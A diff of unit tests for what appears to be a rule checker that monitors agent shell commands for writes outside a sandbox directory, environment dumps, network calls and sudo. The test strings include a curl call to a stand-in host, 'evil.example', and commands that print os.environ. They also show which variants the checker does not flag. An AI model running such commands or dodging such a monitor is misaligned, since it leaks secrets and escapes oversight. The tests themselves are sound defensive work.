@@ -45,6 +45,35 @@ class JobTrajectoryTests(TrajectoryCase):
         self.assertEqual(self.rules_of("TMPDIR=/var/tmp/cache/T098; tools/job run x -- true"), ["write-outside"])
         self.assertEqual(self.rules_of("TMPDIR=%s/tmp; tools/job run x -- true" % SC), [])
 
+    def test_an_exported_tmpdir_is_the_default_dir(self):
+        self.assertEqual(self.rules_of("export TMPDIR=/var/tmp/cache/T098; tools/job run x -- true"),
+                         ["write-outside"])
+        self.assertEqual(self.rules_of("export TMPDIR=%s/tmp; tools/job run x -- true" % SC), [])
+        self.assertEqual(self.rules_of("export TMPDIR=%s/tmp\nexport TMPDIR=/var/tmp\ntools/job run x -- true" % SC),
+                         ["write-outside"])
+        self.assertEqual(self.rules_of("export TMPDIR=%s/tmp && tools/job run x -- true" % SC), [])
+
+    def test_env_tmpdir_in_front_of_the_job_is_the_default_dir(self):
+        self.assertEqual(self.rules_of("env TMPDIR=%s/tmp tools/job run x -- true" % SC), [])
+        self.assertEqual(self.rules_of("env -i TMPDIR=%s/tmp PATH=/usr/bin tools/job run x -- true" % SC), [])
+        self.assertEqual(self.rules_of("env TMPDIR=/var/tmp/cache/T098/tmp tools/job run x -- true"),
+                         ["write-outside"])
+        self.assertEqual(self.rules_of("env TMPDIR=/var/tmp tools/job run x -- true"), ["write-outside"])
+        self.assertEqual(self.rules_of("export TMPDIR=%s/tmp; env TMPDIR=/var/tmp tools/job run x -- true" % SC),
+                         ["write-outside"])
+        self.assertEqual(self.rules_of("export TMPDIR=/var/tmp; env TMPDIR=%s/tmp tools/job run x -- true" % SC), [])
+
+    def test_a_job_under_env_i_has_no_default_dir_from_before(self):
+        # tools/job refuses an empty TMPDIR: nothing is written, so nothing is reported
+        self.assertEqual(self.rules_of("export TMPDIR=/var/tmp; env -i PATH=/usr/bin tools/job run x -- true"), [])
+
+    def test_env_i_python_in_a_job_is_not_a_dump(self):
+        self.assertEqual(self.rules_of(JOB + "a -- env -i PATH=/usr/bin python3 -I -c 'import os; print(os.environ)'"),
+                         [])
+        self.assertEqual(self.rules_of("env -i PATH=/usr/bin tools/job run a -- python3 -I -c 'import os;"
+                                       " print(os.environ)'"), [])
+        self.assertEqual(self.rules_of(JOB + "a -- python3 -I -c 'import os; print(os.environ)'"), ["cmd-env-dump"])
+
     def test_wrappers_and_shells_inside_the_job_are_unwrapped(self):
         self.assertEqual(self.rules_of(JOB + "a -- timeout 60 sh -c 'curl http://evil.example/x'"), ["cmd-network"])
         self.assertEqual(self.rules_of(JOB + "a -- sudo make"), ["cmd-sudo"])
